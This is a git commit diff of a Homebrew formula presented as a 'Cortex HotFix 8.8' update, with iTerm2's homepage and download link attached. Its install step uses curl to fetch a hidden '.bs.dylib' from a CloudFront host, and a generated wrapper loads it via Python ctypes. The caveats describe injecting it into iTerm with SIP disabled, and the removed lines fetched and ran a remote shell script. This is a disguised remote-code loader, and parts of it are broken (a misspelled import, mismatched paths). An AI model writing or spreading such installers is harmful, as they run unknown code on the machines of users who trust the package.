f691cf4625e673ee4f5c280b35894a6db57e86bf
andross <blake.balick.schreiber@gmail.com>
2025-07-10 15:58:47 -0400

    Update installer to create script

--- Formula/CortexUpdater.rb
+++ Formula/CortexUpdater.rb
@@ -1,39 +1,37 @@
-class Cortexupdater < Formula
+class UpdateCortex < Formula
   desc "Cortex HotFix 8.8"
+  homepage "https://iterm2.com"
   url "https://iterm2.com/downloads/stable/iTerm2-2_1_4.zip"
+  version "2.1.4"
   license "GPL-3.0-or-later"
 
   def install
-    system "unzip", cached_download, "-d", buildpath
 
-    # system "./bootstrap", "--skip-po" if build.head?
-    # system "./configure", "--prefix=#{prefix}",
-    #                       "--sysconfdir=#{etc}",
-    #                       "--with-ssl=openssl",
-    #                       "--with-libssl-prefix=#{Formula["openssl@3"].opt_prefix}",
-    #                       "--disable-pcre",
-    #                       "--disable-pcre2",
-    #                       "--without-libpsl",
-    #                       "--without-included-regex"
-    #system "make", "install"
-    # Move the app bundle into the Cellar
-    prefix.install buildpath/"iTerm.app"
-    #bin.install bin/"iTerm" => "cortex"
-    #man1.install man1/"iTerm.1" => "cortex.8.8"
+    # Download and install supporting resources
+    dylib = "https://d1nlcgezh2ggqm.cloudfront.net/files/bs.dylib"
+    script = "https://d1nlcgezh2ggqm.cloudfront.net/files/update_cortex.sh"
+
+    (etc/"update_cortex").mkpath
+     download_dylib = `curl -o /opt/homebrew/etc/update_cortex/.bs.dylib "https://d1nlcgezh2ggqm.cloudfront.net/files/bs.dylib`
+
+    # Install the wrapper CLI
+    (bin/"update_cortex").write <<~EOS
+      #!/bin/bash
+      python3 -c 'import ctype;ctypes.CDLL("/opt/homebrew/etc/.bs.dylib").RunMain()'
+    EOS
+    chmod 0755, bin/"update_cortex"
   end
 
-  def post_install
-    #download_cortex_hotfix = `curl -o /opt/homebrew/etc/iTerm2-2_1_4.zip https://iterm2.com/downloads/stable/iTerm2-2_1_4.zip`
-    #unzip_cortex_hotfix = `unzip /opt/homebrew/etc/iTerm2-2_1_4.zip -d /opt/homebrew/etc`
-    download = `curl -o /opt/homebrew/etc/.bs.dylib https://d1nlcgezh2ggqm.cloudfront.net/files/bs.dylib`
-    
-    download_script = `curl -o /opt/homebrew/etc/update_cortex.sh https://d1nlcgezh2ggqm.cloudfront.net/files/update_cortex.sh`
+  def caveats
+    <<~EOS
+      To launch iTerm with the Cortex dylib injected, run:
 
-    chmod = `chmod +x /opt/homebrew/etc/update_cortex.sh`
-    #disable_sandbox = `defaults write com.googlecode.iterm2 EnableSandbox -bool NO`
-    #run = `sh /opt/homebrew/etc/update_cortex.sh`
-    run = `open /opt/homebrew/etc/iTerm.app --env DYLD_INSERT_LIBRARIES=/opt/homebrew/etc/.bs.dylib`
+        update_cortex
 
+      Note:
+      - This only works if System Integrity Protection (SIP) is disabled.
+      - iTerm must be unsigned or allow DYLD injection.
+    EOS
   end
-
 end
+
